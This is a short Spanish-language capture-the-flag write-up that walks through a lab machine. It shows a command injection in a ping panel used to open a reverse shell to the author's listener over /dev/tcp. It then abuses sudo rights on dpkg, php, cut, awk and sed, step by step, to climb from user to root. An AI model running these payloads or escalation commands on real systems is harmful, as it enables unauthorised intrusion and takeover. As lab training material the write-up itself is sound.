## Reconocimiento:

Puerto 80 : HTTP

Puerto 5000 : UPNP

En el puerto 80 no hay nada interesante. 

En la web del puerto 5000 hay un panel que está esperando una IP para hacerle ping, intento concatenar comandos y es posible.

Me pongo a la escucha:

```bash
nc -lnvp 4444
```

Envío conexión:

```bash
8.8.8.8; bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/4444 <&1'
```

## Escalada freddy → bobby

```bash
sudo -l
(bobby) NOPASSWD: /usr/bin/dpkg
```

Encuentro el binario en GTFO Bins:

```bash
sudo -u bobby dpkg -l
!/bin/bash
```

## Escalada bobby → gladys

```bash
sudo -l
(gladys) NOPASSWD: /usr/bin/php
```

Utilizo:

```bash
CMD="/bin/bash"
sudo -u gladys php -r "system('$CMD');"
```

## Escalada gladys → chocolatito

```bash
sudo -l 
(chocolatito) NOPASSWD: /usr/bin/cut
```

En la carpeta /opt hay un archivo txt interesante que no podemos leer, así que utilizo el binario que casualmente tiene permisos SUID :

```bash
sudo -u chocolatito cut -d "" -f1 chocolatitocontraseña.txt
# Info
chocolatitopassword
```

Es la contraseña de chocolatito.

Para este punto la shell tenía muchos bugs y en mi caso reinicié y desde el usuario freddy me pasé a chocolatito.

## Escalada chocolatito → theboss

```bash
sudo -l
(theboss) NOPASSWD: /usr/bin/awk
```

Gracias GTFO Bins:

```bash
sudo -u theboss awk 'BEGIN {system("/bin/bash")}'
```

## Escalada theboss → root

```bash
sudo -l
(root) NOPASSWD: /usr/bin/sed
```

```bash
sudo sed -n '1e exec bash 1>&0'
```

Listo.
